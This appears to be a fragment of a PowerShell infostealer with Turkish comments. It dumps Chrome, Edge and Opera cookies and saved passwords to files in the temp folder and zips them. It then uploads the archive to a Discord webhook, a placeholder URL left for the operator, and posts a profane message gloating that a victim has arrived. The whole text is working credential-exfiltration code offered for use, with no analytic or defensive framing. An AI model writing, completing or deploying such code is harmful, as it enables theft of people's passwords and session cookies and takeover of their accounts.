# Cookie Dosyalarını Rarlıo
$chromeCookies | Out-File -FilePath "$env:TEMP\chrome_cookies.txt"
$chromePasswords | Out-File -FilePath "$env:TEMP\chrome_passwords.txt"
$edgeCookies | Out-File -FilePath "$env:TEMP\edge_cookies.txt"
$edgePasswords | Out-File -FilePath "$env:TEMP\edge_passwords.txt"
$operaCookies | Out-File -FilePath "$env:TEMP\opera_cookies.txt"
$operaPasswords | Out-File -FilePath "$env:TEMP\opera_passwords.txt"

Set-Location -Path $env:TEMP
Compress-Archive -Path 'chrome_cookies.txt', 'chrome_passwords.txt', 'edge_cookies.txt', 'edge_passwords.txt', 'opera_cookies.txt', 'opera_passwords.txt' -DestinationPath "$env:TEMP\browser_data.zip"

# kaydedilen dosyanı yolu
$zipFilePath = "$env:TEMP\browser_data.zip"

# dc webhook
$webhookUrl = "WEBHOOK_URL_REPLACE"


$discordApiUrl = $webhookUrl

$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

$body = 
@"
--$boundary
Content-Disposition: form-data; name="file"; filename="$(Get-Item -Path $zipFilePath)"
Content-Type: application/octet-stream
$LF
$(Get-Content -Path $zipFilePath -Raw)
$LF
--$boundary--
"@

Invoke-RestMethod -Uri $discordApiUrl -Method Post -Headers $headers -Body $body

# Discord mesaj içeriği
$message = @{
    content = "ENAYİ GELDİ KOŞ AMINAKOYİM KOŞ @everyone"
} | ConvertTo-Json

# 
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $message
